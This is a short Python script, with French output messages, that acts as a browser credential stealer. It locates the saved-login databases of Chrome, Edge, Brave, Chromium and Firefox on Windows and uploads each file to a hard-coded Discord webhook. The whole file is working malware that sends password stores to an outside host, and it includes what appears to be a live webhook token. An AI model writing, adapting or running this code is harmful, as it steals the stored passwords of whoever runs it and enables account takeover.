import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1345358679171403886/WAzyBliP6RLEhMifOdLBvt1hCYsfKuXaDDtm3u-qu9QxfjweG4pboVbPal2-fs_Jxkrc"

files = {
    "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
    "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
    "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
    "Chromium": os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data\Default\Login Data"),
    "Firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\xxxxxx.default-release\logins.json"),
}

for browser, path in files.items():
    if os.path.exists(path):
        with open(path, "rb") as f:
            response = requests.post(WEBHOOK_URL, files={"file": (f"{browser}_Login_Data", f)})
            print(f"Envoyé : {browser}, Réponse : {response.status_code}")
